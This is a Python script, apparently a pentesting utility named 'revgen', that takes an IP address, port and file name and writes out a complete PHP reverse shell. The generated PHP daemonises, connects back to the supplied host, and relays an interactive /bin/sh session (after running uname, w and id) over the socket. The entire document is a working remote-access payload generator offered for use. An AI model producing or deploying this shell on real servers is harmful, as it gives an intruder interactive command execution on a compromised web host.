#!/usr/bin/python3

# revgen: generate reverse shell payloads for use on various webapp pentesting applications.

import string
from argparse import ArgumentParser

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


parser = ArgumentParser()
parser.add_argument("-i", "--ip", dest="host", help="specify your IP address here.")
parser.add_argument("-p", "--port", dest="port", help="specify your nc listening port here.")
parser.add_argument("-o", "--output", dest="output", help="specify the revshell name here.")
args = parser.parse_args()

if args.host is not None or args.port is not None and args.output is not None:
    host = "'" + args.host + "'"
    port = args.port
    file = args.output
else:
    print(" [" + bcolors.FAIL + "!" + bcolors.ENDC + "] ERROR: You must specify a host IP and port and an output name"
                                                     " or path.")
    exit()

php_reverse = [
    "<?php",
    "set_time_limit (0);",
    "$VERSION = " + '"' + str(1.0) + '"' + ";",
    "$ip = " + host + ";",
    "$port = " + port + ";",
    "$chunk_size = 1400;",
    "$write_a = null;",
    "$error_a = null;",
    "$shell = 'uname -a; w; id; /bin/sh -i';",
    "$daemon = 0;",
    "$debug = 0;",
    "if (function_exists('pcntl_fork')) {",
    "$pid = pcntl_fork();",
    "if ($pid == -1) {",
    "printit(" + '"ERROR: Cant fork"' + ");",
    "exit(1);",
    "}",
    "if ($pid) {",
    "exit(0); // Parent exits",
    "}",
    "if (posix_setsid() == -1) {",
    "printit(" + '"Error: Cant setsid()"' + ");",
    "exit(1);",
    "}",
    "$daemon = 1;",
    "} else {",
    "printit(" + '"WARNING: Failed to daemonise.  This is quite common and not fatal."' + ");",
    "}",
    "chdir(" + '"/"' + ");",
    "umask(0);",
    "$sock = fsockopen($ip, $port, $errno, $errstr, 30);",
    "if (!$sock) {",
    "printit(" + '"$errstr ($errno)"' + ");",
    "exit(1);",
    "}",
    "$descriptorspec = array(",
    "0 => array(" + '"pipe"' + ", " + '"r"' + "),",
    "1 => array(" + '"pipe"' + ", " + '"w"' + "),",
    "2 => array(" + '"pipe"' + ", " + '"w"' + ")",
    ");",
    "$process = proc_open($shell, $descriptorspec, $pipes);",
    "if (!is_resource($process)) {",
    "printit(" + '"ERROR: Cant spawn shell"' + ");",
    "exit(1);",
    "}",
    "stream_set_blocking($pipes[0], 0);",
    "stream_set_blocking($pipes[1], 0);",
    "stream_set_blocking($pipes[2], 0);",
    "stream_set_blocking($sock, 0);",
    "printit(" + '"Successfully opened reverse shell to $ip:$port"' + ");",
    "while (1) {",
    "if (feof($sock)) {",
    "printit(" + '"ERROR: Shell connection terminated"' + ");",
    "break;",
    "}",
    "if (feof($pipes[1])) {",
    "printit(" + '"ERROR: Shell process terminated"' + ");",
    "break;",
    "}",
    "$read_a = array($sock, $pipes[1], $pipes[2]);",
    "$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);",
    "if (in_array($sock, $read_a)) {",
    "if ($debug) printit(" + '"SOCK READ"' + ");",
    "$input = fread($sock, $chunk_size);",
    "if ($debug) printit(" + '"SOCK: $input"' + ");",
    "fwrite($pipes[0], $input);",
    "}",
    "if (in_array($pipes[1], $read_a)) {",
    "if ($debug) printit(" + '"STDOUT READ"' + ");",
    "$input = fread($pipes[1], $chunk_size);",
    "if ($debug) printit(" + '"STDOUT: $input"' + ");",
    "fwrite($sock, $input);",
    "}",
    "if (in_array($pipes[2], $read_a)) {",
    "if ($debug) printit(" + '"STDERR READ"' + ");",
    "$input = fread($pipes[2], $chunk_size);",
    "if ($debug) printit(" + '"STDERR: $input"' + ");",
    "fwrite($sock, $input);",
    "}",
    "}",
    "fclose($sock);",
    "fclose($pipes[0]);",
    "fclose($pipes[1]);",
    "fclose($pipes[2]);",
    "proc_close($process);",
    "function printit ($string) {",
    "if (!$daemon) {",
    "print " + '"$string\n"' + ";",
    "}",
    "}",
    "?>",
]

try:
    f = open(file, "w+")
    for line in php_reverse:
        f.write(line + "\n")
    f.close()
    print(" [" + bcolors.OKGREEN + "+" + bcolors.ENDC + "] Successfully created " + file + ".")
except:
    print(" [" + bcolors.FAIL + "!" + bcolors.ENDC + "] ERROR: Something went wrong while creating " + file + ".")
    exit()
